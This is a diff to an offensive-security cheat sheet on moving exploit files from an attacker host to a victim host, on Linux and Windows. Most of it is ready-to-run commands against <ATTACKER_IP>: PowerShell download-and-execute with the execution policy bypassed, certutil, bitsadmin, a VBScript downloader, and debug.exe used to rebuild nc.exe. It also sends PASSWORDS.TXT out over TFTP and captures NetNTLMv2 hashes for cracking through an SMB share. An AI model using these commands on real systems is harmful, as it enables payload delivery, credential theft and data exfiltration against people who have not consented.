@@ -1,4 +1,4 @@
-# Transferring Files from Linux to Linux
+# Transferring Files from Linux **TO** Linux
 
 ## On attacker host
 
@@ -12,15 +12,12 @@ python -m SimpleHTTPServer 4444
 * Curl
 * Netcat
 * Ncat
-* PHP
-```
-echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > 
-```
+* PHP (`echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>"`)
 * TFTP
 * FTP
 * SCP
 
-# Transferring Files from Linux to Windows
+# Transferring Files from Linux **TO** Windows
 
 ## PowerShell
 
@@ -31,14 +28,17 @@ python -m SimpleHTTPServer 4444
 
 **On victim host**
 * Browse http://<ATTACKER_IP>:4444/EXPLOIT.EXE
-* **Download** file with a powershell command:
+* **Download** file:
 ```
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -c "(new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>/EXPLOIT.EXE','C:\temp\EXPLOIT.EXE')"
+```
+```
+powershell.exe  -c "iwr -o EXPLOIT.EXE http://<ATTACKER_IP>/EXPLOIT.EXE"
 ```
 
 * **Download** and **execute** a powershell script:
 ```
-powershell "IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
+powershell "IEX(New Object Net.WebClient).downloadString('http://<ATTACKER_IP>/EXPLOIT.ps1')"
 ```
 
 ## FTP
@@ -61,7 +61,7 @@ C:\temp>echo bye>>ftp_commands.txt
 C:\temp>ftp -v -s:ftp_commands.txt 
 ```
 
-## TFTP
+## TFTP
 
 It used to be installed by default in Windows XP, but now needs to be manually enabled on newer versions of Windows.
 
@@ -102,9 +102,13 @@ tftp -i <ATTACKER_IP> PUT PASSWORDS.TXT
 python smbserver.py SHARE <ATTACKER_DIR>
 ```
 
-If you look at the output from `smbserver.py`, you can see that every time we access the share it outputs the NetNTLMv2 hash from the current Windows user. You can feed these into John or Hashcat and crack them if you want (assuming you can't just elevate to System and get them from Mimikatz)
+:warning: If you look at the output from `smbserver.py`, you can see that every time we access the share it outputs the NetNTLMv2 hash from the current Windows user. You can feed these into John or Hashcat and crack them if you want (assuming you can't just elevate to System and get them from Mimikatz)
 
 **On victim host**
+* Connect to our shared drive
+```
+net use \\<ATTACKER_IP>\SHARE
+```
 * Get file
 ```
 copy \\<ATTACKER_IP>\SHARE\EXPLOIT.EXE 
@@ -117,7 +121,7 @@ copy \\<ATTACKER_IP>\SHARE\EXPLOIT.EXE
 
 ## VBScript
 
-Here is a good script to make a wget-clone in VB:
+* Here is a good script to make a wget-clone in VB:
 ```
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -146,14 +150,14 @@ echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 ```
 
-Execute the script:
+* Execute the script:
 ```
 cscript wget.vbs http://<ATTACKER_IP>/EXPLOIT.EXE EXPLOIT.EXE
 ```
 
 ## Debug.exe
 
-Works on **windows 32 bit** machines. Payload size must be lower than 64 kb!
+:warning: Works on **windows 32 bit** machines. Payload size must be lower than 64 kb!
 
 **On attacker host**
 * Compress `nc.exe`
@@ -170,18 +174,18 @@ wine exe2bat.exe nc.exe nc.txt
 
 Just copy-past the text into our windows-shell. And it will automatically create a file called `nc.exe`
 
-## CertUtil
+## CertUtil
 
 **On victim host**
 ```
-certutil.exe -urlcache -f http://10.0.0.5/EXPLOIT.EXE EXPLOIT.EXE
+certutil.exe -urlcache -f http://<ATTACKER_IP>/EXPLOIT.EXE EXPLOIT.EXE
 ```
 
-## bitsadmin
+## bitsadmin
 
-Download files in Windows with bitsadmin:
+**On victim host**
 ```
-bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
+bitsadmin /transfer mydownloadjob /download /priority normal http://<ATTACKER_IP>/EXPLOIT.EXE C:\\Users\\%USERNAME%\\AppData\\local\\temp\\EXPLOIT.EXE
 ```
 
 # References
